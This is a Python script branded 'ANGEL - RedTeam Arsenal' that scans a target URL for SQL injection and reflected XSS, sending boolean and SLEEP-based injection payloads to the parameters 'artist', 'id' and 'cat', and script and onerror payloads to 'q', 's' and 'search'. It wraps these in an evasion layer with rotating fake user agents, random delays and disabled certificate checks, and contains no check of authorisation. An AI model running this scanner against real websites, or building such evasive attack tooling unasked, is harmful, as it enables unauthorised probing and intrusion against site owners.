#!/usr/bin/env python3
import requests, time, random, json, argparse
from fake_useragent import UserAgent
from urllib.parse import quote

class OpSec:
    def __init__(self):
        self.ua = UserAgent()
        self.session = requests.Session()
        self.session.verify = False
    def request(self, url):
        time.sleep(random.uniform(0.5, 1.5))
        headers = {'User-Agent': self.ua.random}
        return self.session.get(url, headers=headers, timeout=10)

class SQLScanner:
    def __init__(self, op):
        self.op = op
    def scan(self, url, param):
        results = {}
        # Boolean
        try:
            r1 = self.op.request(f"{url}?{param}=1 AND '1'='1'")
            r2 = self.op.request(f"{url}?{param}=1 AND '1'='2'")
            if r1.status_code == 200 and r2.status_code != 200:
                results['boolean'] = True
            else:
                results['boolean'] = False
        except:
            results['boolean'] = False
        # Time
        try:
            start = time.time()
            self.op.request(f"{url}?{param}=1 AND SLEEP(5)--")
            if time.time() - start >= 4.5:
                results['time'] = True
            else:
                results['time'] = False
        except:
            results['time'] = False
        return results

class XSSScanner:
    def __init__(self, op):
        self.op = op
    def scan(self, url, param):
        payloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>']
        for p in payloads:
            try:
                resp = self.op.request(f"{url}?{param}={quote(p)}")
                if p in resp.text:
                    return True
            except:
                continue
        return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True)
    args = parser.parse_args()
    target = args.url

    op = OpSec()
    sql = SQLScanner(op)
    xss = XSSScanner(op)

    print("\n" + "="*50)
    print("ANGEL - RedTeam Arsenal")
    print("For @seala4ngel")
    print("="*50)
    print(f"[*] Target: {target}\n")

    # SQL Injection
    print("[*] Scanning SQL Injection...")
    for param in ['artist', 'id', 'cat']:
        result = sql.scan(target, param)
        if result.get('boolean') or result.get('time'):
            print(f"[!] SQLi Found on {param}")
            # save result
        else:
            print(f"[X] No SQLi on {param}")

    # XSS
    print("\n[*] Scanning XSS...")
    for param in ['q', 's', 'search']:
        if xss.scan(target, param):
            print(f"[!] XSS Found on {param}")
        else:
            print(f"[X] No XSS on {param}")

    print("\n[*] Done.")

if __name__ == '__main__':
    main()
